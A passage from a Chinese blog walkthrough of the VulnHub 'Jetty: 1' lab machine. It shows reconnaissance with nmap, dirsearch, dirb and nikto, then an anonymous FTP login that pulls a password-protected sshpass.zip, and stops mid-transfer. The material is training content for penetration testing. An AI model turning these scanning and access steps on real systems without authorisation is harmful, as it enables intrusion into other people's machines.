<!DOCTYPE html><html lang="zh-CN"><head><script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script><script src="https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min.js"></script><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.3.0"><link rel="apple-touch-icon" sizes="180x180" href="/images/pika.png"><link rel="icon" type="image/png" sizes="32x32" href="/images/pika.png"><link rel="icon" type="image/png" sizes="16x16" href="/images/pika.svg"><link rel="mask-icon" href="/images/pika.svg" color="#222"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/pace-js@1/themes/blue/pace-theme-minimal.css"><script src="//cdn.jsdelivr.net/npm/pace-js@1/pace.min.js"></script><script id="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"dnie9.com",root:"/",scheme:"Pisces",version:"7.8.0",exturl:!1,sidebar:{position:"right",width:240,display:"post",padding:18,offset:12,onmobile:!1},copycode:{enable:!0,show_result:!1,style:null},back2top:{enable:!0,sidebar:!0,scrollpercent:!0},bookmark:{enable:!0,color:"#222",save:"auto"},fancybox:!0,mediumzoom:!1,lazyload:!1,pangu:!1,comments:{style:"tabs",active:null,storage:!0,lazyload:!1,nav:null},algolia:{hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}},localsearch:{enable:!1,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}}}</script><meta name="description" content="记录了针对靶机Jetty-1的渗透测试过程，也详细记录了失败尝试的过程，留念一下自己第一次对pyinstaller打包unpack和代码提取的过程。学习到了很多，针对有意义的靶机攻击和渗透过程，再次进行输出沉淀，用博客和文章的形式输出，真的是超级赞的方式，分享者是最大的学习收获者！ 靶机描述该靶机攻取获得ROOT权限为中等难度，但是获取证据，需要对pyinstaller的程序进行以及代码提取。这样"><meta property="og:type" content="article"><meta property="og:title" content="Jetty 1 Workthrough"><meta property="og:url" content="https://dnie9.com/Jetty-1-wp.html"><meta property="og:site_name" content="D9‘s 学习之路~"><meta property="og:description" content="记录了针对靶机Jetty-1的渗透测试过程，也详细记录了失败尝试的过程，留念一下自己第一次对pyinstaller打包unpack和代码提取的过程。学习到了很多，针对有意义的靶机攻击和渗透过程，再次进行输出沉淀，用博客和文章的形式输出，真的是超级赞的方式，分享者是最大的学习收获者！ 靶机描述该靶机攻取获得ROOT权限为中等难度，但是获取证据，需要对pyinstaller的程序进行以及代码提取。这样"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://dnie9.com/images/Jetty-1/dirb-1.png"><meta property="og:image" content="https://dnie9.com/images/Jetty-1/error-cyb.png"><meta property="og:image" content="https://dnie9.com/images/Jetty-1/httpserver-getinformation.png"><meta property="og:image" content="https://dnie9.com/images/Jetty-1/password-error.png"><meta property="og:image" content="https://dnie9.com/images/Jetty-1/password-error-2.png"><meta property="og:image" content="https://dnie9.com/images/Jetty-1/password_keeper.exe.png"><meta property="og:image" content="https://dnie9.com/images/Jetty-1/excel-1.png"><meta property="og:image" content="https://dnie9.com/images/Jetty-1/pyc-1.png"><meta property="og:image" content="https://dnie9.com/images/Jetty-1/pyc-2.png"><meta property="article:published_time" content="2021-02-20T13:10:12.000Z"><meta property="article:modified_time" content="2021-02-20T13:17:22.353Z"><meta property="article:author" content="D9"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://dnie9.com/images/Jetty-1/dirb-1.png"><link rel="canonical" href="https://dnie9.com/Jetty-1-wp.html"><script id="page-configurations">CONFIG.page={sidebar:"",isHome:!1,isPost:!0,lang:"zh-CN"}</script><script>
  window.addEventListener('DOMContentLoaded', () => {
    'use strict';
    
      if (NexT.utils.hasMobileUA()) return;
    
    let time, hidden, visible, title = document.title;
    let favicon = document.querySelector('link[rel="icon"]');
    
      hidden = 'φ(*￣0￣),在等你～';
      visible = '(✿◡‿◡),开源社区最强!';
    
    let random = t => t[Math.floor(Math.random() * t.length)];
    const change = () => {
      if (document.hidden) {
        favicon.setAttribute('href', '/images/logo.png');
        
          document.title = hidden;
        
        clearTimeout(time);
      } else {
        favicon.setAttribute('href', '/images/logo.png');
        
          document.title = visible;
        
        time = setTimeout(() => {
          document.title = title;
        }, 2019);
      }
    }
    document.addEventListener('visibilitychange', change, false);
  });
</script><title>Jetty 1 Workthrough | D9‘s 学习之路~</title><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript></head><script src="/live2d-widget/autoload.js"></script><body itemscope itemtype="http://schema.org/WebPage"><script type="text/javascript" src="\js\snow.js"></script><div class="container use-motion"><div class="headband"></div><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="切换导航栏"><span class="toggle-line toggle-line-first"></span><span class="toggle-line toggle-line-middle"></span><span class="toggle-line toggle-line-last"></span></div></div><div class="site-meta"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span><h1 class="site-title">D9‘s 学习之路~</h1><span class="logo-line-after"><i></i></span></a><p class="site-subtitle" itemprop="description">甲方一废，严重缺爱</p></div><div class="site-nav-right"><div class="toggle popup-trigger"></div></div></div><nav class="site-nav"><ul id="menu" class="main-menu menu"><li class="menu-item menu-item-home"><a href="/home/" rel="section"><i class="fa fa-home fa-fw"></i> 首页</a></li><li class="menu-item menu-item-categories"><a href="/BJ/" rel="section"><i class="fa fa-gamepad fa-fw"></i> 天天向上～<span class="badge">3</span></a></li></ul></nav></div></header><div class="reading-progress-bar"></div><a role="button" class="book-mark-link book-mark-link-fixed"></a> <a href="https://github.com/DDnie19" class="github-corner" title="关照一下店小二~~" aria-label="关照一下店小二~~" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0 0 115 115 130 115 142 142 250 250 250 0Z"></path><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentColor" style="transform-origin:130px 106px" class="octo-arm"></path><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4L133.7 101.6C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8Z" fill="currentColor" class="octo-body"></path></svg></a><main class="main"><div class="main-inner"><div class="content-wrap"><div class="content post posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://dnie9.com/Jetty-1-wp.html"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/logo.png"><meta itemprop="name" content="D9"><meta itemprop="description" content="谁人与我共黄昏…"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="D9‘s 学习之路~"></span><header class="post-header"><h1 class="post-title" itemprop="name headline"> Jetty 1 Workthrough</h1><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建时间：2021-02-20 21:10:12 / 修改时间：21:17:22" itemprop="dateCreated datePublished" datetime="2021-02-20T21:10:12+08:00">2021-02-20</time></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i></span> <span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E9%9D%B6%E6%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶机</span></a></span></span><span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-eye"></i></span> <span class="post-meta-item-text">阅读次数：</span><span id="busuanzi_value_page_pv"></span></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i></span> <span class="post-meta-item-text">本文字数：</span> <span>20k</span></span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i></span> <span class="post-meta-item-text">阅读时长 &asymp;</span> <span>18 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><p>记录了针对靶机Jetty-1的渗透测试过程，也详细记录了失败尝试的过程，留念一下自己第一次对<code>pyinstaller</code>打包<code>unpack</code>和代码提取的过程。学习到了很多，针对有意义的靶机攻击和渗透过程，再次进行输出沉淀，用博客和文章的形式输出，真的是超级赞的方式，分享者是最大的学习收获者！</p><h3 id="靶机描述"><a href="#靶机描述" class="headerlink" title="靶机描述"></a>靶机描述</h3><p>该靶机攻取获得ROOT权限为中等难度，但是获取证据，需要对<code>pyinstaller</code>的程序进行以及代码提取。这样才能破解最后的加密<code>execl文档</code>。</p><a id="more"></a><p>• <strong>Name</strong>: Jetty: 1<br>• <strong>Date release</strong>: 9 Dec 2020<br>• <strong>Author</strong>: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/author/mrsquid,762/">MrSquid</a><br>• <strong>Series</strong>: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/series/jetty,420/">Jetty</a></p><h3 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h3><p>Please remember that VulnHub is a free community resource so we are unable to check the machines that are provided to us. Before you download, please read our FAQs sections dealing with the dangers of running unknown VMs and our suggestions for “protecting yourself and your network. If you understand the risks, please download!<br>◇ <strong>Jetty-Vulnhub.7z</strong> (Size: 4.1 GB)<br>◇ <strong>Download (Mirror)</strong>: <a target="_blank" rel="noopener" href="https://download.vulnhub.com/jetty/Jetty-Vulnhub.7z">https://download.vulnhub.com/jetty/Jetty-Vulnhub.7z</a><br>◇ <strong>Download (Torrent)</strong>: <a target="_blank" rel="noopener" href="https://download.vulnhub.com/jetty/Jetty-Vulnhub.7z.torrent">https://download.vulnhub.com/jetty/Jetty-Vulnhub.7z.torrent</a> ( <a target="_blank" rel="noopener" href="http://magnet/?xt=urn:btih:55419D3A723B3D8AFDFB1365C51779444BEDED38&dn=Jetty-Vulnhub.7z&tr=http://tracker.vulnhub.com:6969/announce&tr=udp://tracker.vulnhub.com:6969/announce&tr=udp://tracker.openbittorrent.com:80/announce&tr=udp://tracker.publicbt.com:80/announce&tr=udp://tracker.istole.it:6969">Magnet</a>)</p><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>The company Aquarium Life S.L. has contacted you to perform a pentest against one of their machines. They suspect that one of their employees has been committing fraud selling fake tickets. They want you to break into his computer, escalate privileges and search for any evidences that proves this behaviour.<br>ZIP Password: <code>EsSabad0!</code><br>Extra information:<br>◇ <strong>The suspicious username is Squiddie.</strong> 注意登录时，首字母小写。坑死我了！<br>◇ <strong>He was in charge of the ticket selling for the Aquarium.</strong><br>◇ <strong>Ethernet settings set to NAT with DHCP enabled.</strong><br>◇ <strong>You should find the IP in your VLAN.</strong></p><p>The idea of the machine it is not just to gain root privileges but obtaining all the evidences to prove that the user was commiting fraud.<br>Difficulty: I would say the machine is Medium regarding gaining root privileges. If we consider all the steps to obtain the evidences, Hard.</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="NMAP-SCAN"><a href="#NMAP-SCAN" class="headerlink" title="NMAP-SCAN"></a>NMAP-SCAN</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">──(d9㉿D9)-[~/1self/vulnhub_wp/jetty1]</span><br><span class="line">└─$ fping -g -a 192.168.88.0/24                                           </span><br><span class="line">192.168.88.1</span><br><span class="line">192.168.88.146</span><br><span class="line"><span class="comment">##fping进行icmp存活探测，仅输出存活主机。</span></span><br><span class="line">└─$ sudo nmap -sS -Pn -n -p- 192.168.88.146  -sV  -sC -O -A               <span class="comment">##nmap --script-update 更新sciptes库，</span></span><br><span class="line"><span class="comment">##-sS：tcp-syn扫描，</span></span><br><span class="line"><span class="comment">##-Pn：不进行存活探测，</span></span><br><span class="line"><span class="comment">##-n:不进行DNS解析</span></span><br><span class="line"><span class="comment">##-p- : T:1-65535 全端口，</span></span><br><span class="line"><span class="comment">##-sV :服务识别，</span></span><br><span class="line"><span class="comment">##-sC：全script脚本探测，加载/usr/share/nmap/scripts/*</span></span><br><span class="line"><span class="comment">##-O：操作系统识别，</span></span><br><span class="line"><span class="comment">##-A：全自动扫描开关。</span></span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked <span class="string">&#x27;up&#x27;</span> and scan <span class="built_in">times</span> will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-19 20:25 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.88.146</span><br><span class="line">Host is up (0.00096s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">21/tcp    open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| -rwxrwxrwx    1 ftp      ftp           306 Oct 06  2018 README.txt [NSE: writeable]</span><br><span class="line">|_-rwxrwxrwx    1 ftp      ftp           226 Oct 06  2018 sshpass.zip [NSE: writeable]</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 192.168.88.1</span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      Session bandwidth <span class="built_in">limit</span> <span class="keyword">in</span> byte/s is 2048000</span><br><span class="line">|      Session timeout <span class="keyword">in</span> seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 4</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-robots.txt: 4 disallowed entries </span><br><span class="line">|_/dir/ /passwords/ /facebook_photos /admin/secret</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">65507/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span></span><br><span class="line"><span class="string">| ssh-hostkey: </span></span><br><span class="line"><span class="string">|   2048 a0:5b:e6:bb:fd:f6:02:ec:f0:bd:a1:be:b8:97:84:ba (RSA)</span></span><br><span class="line"><span class="string">|   256 e9:d3:50:26:7e:5a:c2:a0:b0:89:c9:f4:64:d8:aa:b0 (ECDSA)</span></span><br><span class="line"><span class="string">|_  256 2e:67:c1:af:cc:22:5c:59:15:5f:97:f7:2e:1b:e0:93 (ED25519)</span></span><br><span class="line"><span class="string">MAC Address: 00:0C:29:48:69:6C (VMware)</span></span><br><span class="line"><span class="string">Device type: general purpose</span></span><br><span class="line"><span class="string">Running: Linux 3.X|4.X</span></span><br><span class="line"><span class="string">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span></span><br><span class="line"><span class="string">OS details: Linux 3.2 - 4.9</span></span><br><span class="line"><span class="string">Network Distance: 1 hop</span></span><br><span class="line"><span class="string">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">TRACEROUTE</span></span><br><span class="line"><span class="string">HOP RTT     ADDRESS</span></span><br><span class="line"><span class="string">1   0.96 ms 192.168.88.146</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 15.16 seconds</span></span><br></pre></td></tr></table></figure><h4 id="DirbScan-Nikto"><a href="#DirbScan-Nikto" class="headerlink" title="DirbScan+Nikto"></a>DirbScan+Nikto</h4><p>失败的尝试，发现了一个失败性的密码文件……</p><p><code>python3 dirsearch.py -e html,txt,php,js -u http://192.168.88.146 -t 64 -f</code></p><p><img src="/images/Jetty-1/dirb-1.png" alt="dirb-1"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -e html,txt,php,js -u http://192.168.88.146 -t 64 -f </span><br><span class="line"></span><br><span class="line">└─$ dirb http://192.168.88.146  </span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                     </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.88.146/ ----</span><br><span class="line">+ http://192.168.88.146/index.html (CODE:200|SIZE:23)</span><br><span class="line">+ http://192.168.88.146/robots.txt (CODE:200|SIZE:104)                          </span><br><span class="line">+ http://192.168.88.146/server-status (CODE:403|SIZE:302)    </span><br><span class="line"></span><br><span class="line">Get infromation by  http://192.168.88.146/recoverpassword.txt</span><br><span class="line">Backup password:</span><br><span class="line"><span class="comment">###dirsearch -e:files extions -u 目标path -t 线程 -f 把每一个后缀添加到字典中</span></span><br><span class="line">str(<span class="string">&#x27;&amp;%$#&quot;!~&#125;|&#123;zyxwvut210/.-,+k)(!Efedcba`_^]\[ZYXWVUTpohmlkjihg`&amp;GFEDCBA@?&gt;=&lt;;:</span></span><br><span class="line"><span class="string">9876543210/.-,+*)(&#x27;</span>&amp;%<span class="variable">$#</span><span class="string">&quot;!~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWmrkponmlkdc</span></span><br><span class="line"><span class="string">b(`_dc\&quot;`BX|?&gt;Z&lt;RWVUNSRKoONGLKDh+*)(&#x27;&amp;BA:?&gt;=&lt;;:92Vw/43,10)Mnmlkjihgfedcba`_^</span></span><br><span class="line"><span class="string">]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9UTSRQ3ONMLKJCg*)(&#x27;&amp;%<span class="variable">$#</span>&quot;</span>!~&#125;|&#123;zyxwvutsrq/</span><br><span class="line">(-,+*)(<span class="string">&#x27;&amp;&#125;|B&quot;b~&#125;v&#123;ts9wputsrqj0QPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(&#x27;</span>&amp;%$</span><br><span class="line"><span class="comment">#&quot;!~&#125;|&#123;zyxwvutsr0/.-,+*)(!~%|Bcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876</span></span><br><span class="line">543210/.-,+*)(<span class="string">&#x27;&amp;B$:?&gt;=&lt;;:3270Tu-,+O/.n,%Ijihgfedcba`_^]\[ZYXWVUTSonmlkMibgf_</span></span><br><span class="line"><span class="string">^$EaZ_^]VUy&lt;XWPOs6543210/.-,+*)(&#x27;</span>&amp;%<span class="variable">$#</span><span class="string">&quot;!~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\[Z</span></span><br><span class="line"><span class="string">YXWVUTSRQPONjihgfedcb[ZBX|\UZYRv9876543210/.-,+*)(&#x27;&amp;B<span class="variable">$@</span>?&gt;=&lt;5:381Uvutsrqpo-,+</span></span><br><span class="line"><span class="string">k)&quot;</span><span class="string">&#x27;&amp;%|&#123;Aba`_^]yxwYutsrqpi/PONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(&#x27;</span>&amp;%<span class="variable">$#</span><span class="string">&quot;!~</span></span><br><span class="line"><span class="string">&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_&#123;]sxwvutslkji/PONMLKaf_^]ba`_^W&#123;[ZYXWPOsMRQJI</span></span><br><span class="line"><span class="string">mGLKJIHG@dDCB;:9]~6;:92Vwvutsrqponmlkjihgfe#&quot;</span>!~&#125;|&#123;zyxq7utsrTpong-NMLKJIHGFED</span><br><span class="line">CBA@?&gt;=&lt;;:9876543210/.-,+*)(<span class="string">&#x27;&amp;%$#&quot;!~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]sxwvuts</span></span><br><span class="line"><span class="string">rqjihg-,w)</span></span><br><span class="line"><span class="string">###无用信息……</span></span><br><span class="line"><span class="string">┌──(d9㉿D9)-[~/1self/vulnhub_wp/jetty1]</span></span><br><span class="line"><span class="string">└─$ nikto -h 192.168.88.146                                               </span></span><br><span class="line"><span class="string">- Nikto v2.1.6</span></span><br><span class="line"><span class="string">---------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">+ Target IP:          192.168.88.146</span></span><br><span class="line"><span class="string">+ Target Hostname:    192.168.88.146</span></span><br><span class="line"><span class="string">+ Target Port:        80</span></span><br><span class="line"><span class="string">+ Start Time:         2021-02-19 20:24:20 (GMT8)</span></span><br><span class="line"><span class="string">---------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">+ Server: Apache/2.4.29 (Ubuntu)</span></span><br><span class="line"><span class="string">+ The anti-clickjacking X-Frame-Options header is not present.</span></span><br><span class="line"><span class="string">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span></span><br><span class="line"><span class="string">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span></span><br><span class="line"><span class="string">+ No CGI Directories found (use &#x27;</span>-C all<span class="string">&#x27; to force check all possible dirs)</span></span><br><span class="line"><span class="string">+ &quot;robots.txt&quot; contains 4 entries which should be manually viewed.</span></span><br><span class="line"><span class="string">+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</span></span><br><span class="line"><span class="string">+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD </span></span><br><span class="line"><span class="string">+ OSVDB-3233: /icons/README: Apache default file found.</span></span><br><span class="line"><span class="string">+ 7921 requests: 0 error(s) and 7 item(s) reported on remote host</span></span><br><span class="line"><span class="string">+ End Time:           2021-02-19 20:24:45 (GMT8) (25 seconds)</span></span><br><span class="line"><span class="string">---------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">+ 1 host(s) tested</span></span><br><span class="line"><span class="string">### robots.txt 中的每一个目录都是404，而且我对每一个都进行了+/path目录爆破也是无果</span></span><br></pre></td></tr></table></figure><p><img src="/images/Jetty-1/error-cyb.png" alt="error-cyb"></p><h3 id="FTP-Cracked-zip-password-with-john"><a href="#FTP-Cracked-zip-password-with-john" class="headerlink" title="FTP-Cracked zip password with john"></a>FTP-Cracked zip password with john</h3><p>得知目标开放IP和开放端口，对ftp端口可以进行匿名访问，获取对应文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; user</span><br><span class="line">(username) anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; dir</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rwxrwxrwx    1 ftp      ftp           306 Oct 06  2018 README.txt</span><br><span class="line">-rwxrwxrwx    1 ftp      ftp           226 Oct 06  2018 sshpass.zip</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; get README.txt</span><br><span class="line"><span class="built_in">local</span>: README.txt remote: README.txt</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> README.txt (306 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">306 bytes received <span class="keyword">in</span> 0.00 secs (86.0680 kB/s)</span><br><span class="line">ftp&gt; get sshpass.zip</span><br><span class="line"><span class="built_in">local</span>: sshpass.zip remote: sshpass.zip</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> sshpass.zip (226 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">226 bytes received <span class="keyword">in</span> 0.00 